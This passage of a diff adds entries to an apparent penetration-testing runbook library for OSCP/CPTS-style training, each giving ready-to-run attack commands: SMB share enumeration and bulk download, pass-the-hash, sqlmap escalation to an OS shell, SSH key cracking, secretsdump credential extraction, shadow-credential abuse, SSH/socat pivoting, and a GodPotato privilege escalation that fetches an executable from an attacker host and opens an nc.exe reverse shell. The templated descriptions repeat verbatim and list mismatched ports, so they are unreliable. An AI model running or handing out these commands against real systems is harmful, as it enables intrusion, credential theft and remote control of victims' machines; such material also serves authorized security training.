+      "phase:credential-access",
+      "domain:network",
+      "tool:impacket",
+      "focus:credentials"
+    ]
+  },
+  {
+    "id": "eedb5528-eb6f-5010-aff4-175617a8ca45",
+    "label": "SMBMap Share ACL and Recursive Listing",
+    "command": "smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5\nsmbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only\nsmbmap -u DoesNotExists -H IP",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>SMBMap Share ACL and Recursive Listing</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#smbmap</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Maps SMB permissions and recursively enumerates sensitive domain shares.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Active Directory Enumeration and Attacks.md:85; docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Active Directory Enumeration and Attacks.md:86</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 445</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5\nsmbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only\nsmbmap -u DoesNotExists -H IP</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:recon",
+      "domain:network",
+      "tool:smbmap",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "82112461-dc4b-52fd-8937-2ae9274c2c26",
+    "label": "SMB NSE Heavy Enumeration Pack",
+    "command": "nmap --script smb-enum-*,smb-vuln-* -p 139,445 <IP>\nnmap --script smb-enum-users.nse,smb-enum-shares.nse,smb-security-mode.nse -p 139,445 <IP>",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>SMB NSE Heavy Enumeration Pack</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#nmap</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>High-signal SMB enumeration with service, shares, users, and vuln-oriented scripts.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/lagarian-smith-oscp-cheat-sheet/OSCP_Notes.md:552; docs/sources-runbooks/oscp-cpts/p0/lagarian-smith-oscp-cheat-sheet/OSCP_Notes.md:553</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 445</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>nmap --script smb-enum-*,smb-vuln-* -p 139,445 &lt;IP&gt;\nnmap --script smb-enum-users.nse,smb-enum-shares.nse,smb-security-mode.nse -p 139,445 &lt;IP&gt;</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:recon",
+      "domain:network",
+      "tool:nmap",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "742797a1-61ff-59a2-818f-61387a6a8b92",
+    "label": "SMB Null Session and Recursive Share Download",
+    "command": "smbclient -N -L //<IP>\nsmbclient -N //<IP>/<SHARE> -c \"prompt OFF; recurse ON; mget *\"",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>SMB Null Session and Recursive Share Download</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#smbclient</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Tests guest/null auth and recursively exfiltrates readable share content.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Attack Common Services.md:15; docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:91</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 445</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>smbclient -N -L //&lt;IP&gt;\nsmbclient -N //&lt;IP&gt;/&lt;SHARE&gt; -c &quot;prompt OFF; recurse ON; mget *&quot;</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:recon",
+      "domain:ad",
+      "tool:smbclient",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "906a7075-c360-560d-bad3-22bc4c3a6c67",
+    "label": "SMB Pass-the-Hash Lateral Validation",
+    "command": "crackmapexec smb <RANGE> -u <USER> -d <DOMAIN> -H <NTLM_HASH> --local-auth\ncrackmapexec smb <RANGE> -u <USER> -d <DOMAIN> -p <PASSWORD>",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>SMB Pass-the-Hash Lateral Validation</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#crackmapexec</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Verifies credential reuse and hash-based movement opportunities across hosts.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/lagarian-smith-oscp-cheat-sheet/OSCP_Notes.md:2223; docs/sources-runbooks/oscp-cpts/p0/lagarian-smith-oscp-cheat-sheet/OSCP_Notes.md:2225</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 445</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>crackmapexec smb &lt;RANGE&gt; -u &lt;USER&gt; -d &lt;DOMAIN&gt; -H &lt;NTLM_HASH&gt; --local-auth\ncrackmapexec smb &lt;RANGE&gt; -u &lt;USER&gt; -d &lt;DOMAIN&gt; -p &lt;PASSWORD&gt;</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:credential-access",
+      "domain:network",
+      "tool:crackmapexec",
+      "focus:credentials"
+    ]
+  },
+  {
+    "id": "b6101f13-8480-5c21-b8a2-8d786fbbcaa3",
+    "label": "SNMP Community String and OID Enumeration",
+    "command": "onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt {IP}\nsnmpwalk -v1 -c public {IP}\nsnmpwalk -v2c -c <community string> <FQDN/IP>",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>SNMP Community String and OID Enumeration</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#onesixtyone</span> , <span style=\"color:#ef4444;font-weight:bold;\">#snmpwalk</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Brute-forces SNMP communities and expands host intelligence via OID walks.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:24; docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:26</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">UDP 161</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt {IP}\nsnmpwalk -v1 -c public {IP}\nsnmpwalk -v2c -c &lt;community string&gt; &lt;FQDN/IP&gt;</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:recon",
+      "domain:network",
+      "tool:onesixtyone",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "8be90017-927f-53e3-9561-7d85870babff",
+    "label": "SQLMap Request-File Exploitation Workflow",
+    "command": "sqlmap -r req.txt\nsqlmap -r case2.req --batch -p 'id' --flush-session --level=5 --risk=3\nsqlmap -r os-exploit.req --batch -p \"id\" --os-shell",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>SQLMap Request-File Exploitation Workflow</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#sqlmap</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Uses captured HTTP requests for reliable SQLi detection and escalation to data/OS access.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/sqlmap Essentials.md:11; docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/sqlmap Essentials.md:40</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>sqlmap -r req.txt\nsqlmap -r case2.req --batch -p &#x27;id&#x27; --flush-session --level=5 --risk=3\nsqlmap -r os-exploit.req --batch -p &quot;id&quot; --os-shell</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:initial-access",
+      "domain:web",
+      "tool:sqlmap",
+      "focus:web-testing"
+    ]
+  },
+  {
+    "id": "00af1eb6-3145-52f3-9181-1f472bc07bd1",
+    "label": "SSH Local/Remote/Dynamic Port Forwarding",
+    "command": "ssh -L 1234:localhost:3306 <USER>@<PIVOT_IP>\nssh -R <PIVOT_IP>:8080:0.0.0.0:80 <USER>@<TARGET_IP> -vN\nssh -D 9050 <USER>@<PIVOT_IP>",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>SSH Local/Remote/Dynamic Port Forwarding</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#ssh</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Builds forward and reverse tunnels plus SOCKS transport for deeper network access.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Pivoting Tunneling Port Forwarding.md:7; docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Pivoting Tunneling Port Forwarding.md:23</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>ssh -L 1234:localhost:3306 &lt;USER&gt;@&lt;PIVOT_IP&gt;\nssh -R &lt;PIVOT_IP&gt;:8080:0.0.0.0:80 &lt;USER&gt;@&lt;TARGET_IP&gt; -vN\nssh -D 9050 &lt;USER&gt;@&lt;PIVOT_IP&gt;</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:pivoting",
+      "domain:offensive",
+      "tool:ssh",
+      "focus:pivoting"
+    ]
+  },
+  {
+    "id": "93ade73e-1ac9-5760-a64f-c9b9ee779ca5",
+    "label": "SSH Private Key Attack Chain",
+    "command": "ssh2john id_rsa > ssh.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>SSH Private Key Attack Chain</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#ssh2john</span> , <span style=\"color:#ef4444;font-weight:bold;\">#john</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Converts leaked SSH private keys into crackable material and attempts offline recovery.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/n0xturne-OSCP-Cheat-Sheet-2024/README.md:205</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>ssh2john id_rsa &gt; ssh.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:credential-access",
+      "domain:offensive",
+      "tool:ssh2john",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "a44a8f4c-b8d3-578f-9ef7-f6e61eee36ba",
+    "label": "SSHuttle Routed Pivot into Internal Subnets",
+    "command": "sudo apt-get install sshuttle\nsudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v\nsshuttle -r <USERNAME>@192.168.100.10:2222 10.10.100.0/24 172.16.50.0/24",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>SSHuttle Routed Pivot into Internal Subnets</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#apt-get</span> , <span style=\"color:#ef4444;font-weight:bold;\">#sshuttle</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Creates VPN-like routed access to internal CIDRs over SSH footholds.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Pivoting Tunneling Port Forwarding.md:47; docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Pivoting Tunneling Port Forwarding.md:48</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>sudo apt-get install sshuttle\nsudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v\nsshuttle -r &lt;USERNAME&gt;@192.168.100.10:2222 10.10.100.0/24 172.16.50.0/24</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:pivoting",
+      "domain:offensive",
+      "tool:apt-get",
+      "focus:pivoting"
+    ]
+  },
+  {
+    "id": "89c98094-742b-5c5e-a77e-f0bba99193da",
+    "label": "SeImpersonate Exploitation (GodPotato)",
+    "command": "iwr -uri http://<LHOST>:<LPORT>/GodPotato-NET4.exe -Outfile godpotato.exe\n./godpotato.exe -cmd \"C:/Users/Public/nc.exe -e cmd.exe <LHOST> <LPORT>\"",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>SeImpersonate Exploitation (GodPotato)</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#iwr</span> , <span style=\"color:#ef4444;font-weight:bold;\">#godpotato.exe</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Uses token impersonation privilege to escalate from service/user context to SYSTEM.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/n0xturne-OSCP-Cheat-Sheet-2024/README.md:1185; docs/sources-runbooks/oscp-cpts/p0/n0xturne-OSCP-Cheat-Sheet-2024/README.md:1206</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>iwr -uri http://&lt;LHOST&gt;:&lt;LPORT&gt;/GodPotato-NET4.exe -Outfile godpotato.exe\n.\\godpotato.exe -cmd &quot;C:\\Users\\Public\\nc.exe -e cmd.exe &lt;LHOST&gt; &lt;LPORT&gt;&quot;</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:privilege-escalation",
+      "domain:web",
+      "tool:iwr",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "3a7c4e2c-d403-58cd-932b-1f93803f107e",
+    "label": "Secretsdump SAM/NTDS Credential Extraction",
+    "command": "impacket-secretsdump -system system -sam sam LOCAL\nsecretsdump.py '<DOMAIN>/<USER>:<PASS>@<DC_IP>'",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>Secretsdump SAM/NTDS Credential Extraction</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#impacket</span> , <span style=\"color:#ef4444;font-weight:bold;\">#secretsdump.py</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Extracts local SAM/LSA material or remote domain secrets for offline cracking/abuse.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:105; docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:778</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>impacket-secretsdump -system system -sam sam LOCAL\nsecretsdump.py &#x27;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASS&gt;@&lt;DC_IP&gt;&#x27;</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:recon",
+      "domain:offensive",
+      "tool:impacket",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "ff26ad59-e253-543b-92d4-3daa5a3854a2",
+    "label": "Shadow Credentials Abuse (Certipy)",
+    "command": "certipy shadow auto -u <USER>@<DOMAIN> -p '<PASS>' -account <TARGET_ACCOUNT> -dc-ip <DC_IP>",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>Shadow Credentials Abuse (Certipy)</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#certipy</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Adds/abuses key credentials on target accounts to pivot to certificate-based auth.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:296</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>certipy shadow auto -u &lt;USER&gt;@&lt;DOMAIN&gt; -p &#x27;&lt;PASS&gt;&#x27; -account &lt;TARGET_ACCOUNT&gt; -dc-ip &lt;DC_IP&gt;</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:recon",
+      "domain:offensive",
+      "tool:certipy",
+      "focus:pivoting"
+    ]
+  },
+  {
+    "id": "e6b74ed5-0421-5615-aa4c-82edc8e2744c",
+    "label": "SharpHound Collection from Compromised Windows Host",
+    "command": "Import-Module ./SharpHound.ps1\nInvoke-BloodHound -CollectionMethod All -OutputDirectory <PATH> -OutputPrefix \"audit\"\nInvoke-BloodHound -CollectionMethod All -OutputDirectory <location> -OutputPrefix \"name\"",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>SharpHound Collection from Compromised Windows Host</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#import-module</span> , <span style=\"color:#ef4444;font-weight:bold;\">#invoke-bloodhound</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Collects AD graph data on Windows footholds for BloodHound path analysis.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/BlessedRebuS-OSCP-Pentesting-Cheatsheet/README.md:1360; docs/sources-runbooks/oscp-cpts/p0/BlessedRebuS-OSCP-Pentesting-Cheatsheet/README.md:1366</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>Import-Module .\\\\SharpHound.ps1\nInvoke-BloodHound -CollectionMethod All -OutputDirectory &lt;PATH&gt; -OutputPrefix &quot;audit&quot;\nInvoke-BloodHound -CollectionMethod All -OutputDirectory &lt;location&gt; -OutputPrefix &quot;name&quot;</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:recon",
+      "domain:ad",
+      "tool:import-module",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "56f62f3b-6297-5183-a876-db4d600c9565",
+    "label": "Socat TCP Relay Pivoting",
+    "command": "socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofAttackHost>:80\nsocat TCP4-LISTEN:8080,fork TCP4:<IPaddressofTarget>:8443\nsocat TCP-LISTEN:<LOCAL-PORT>,fork TCP:<REMOTE-IP>:<REMOTE-PORT>",
+    "color": "#dc2626",
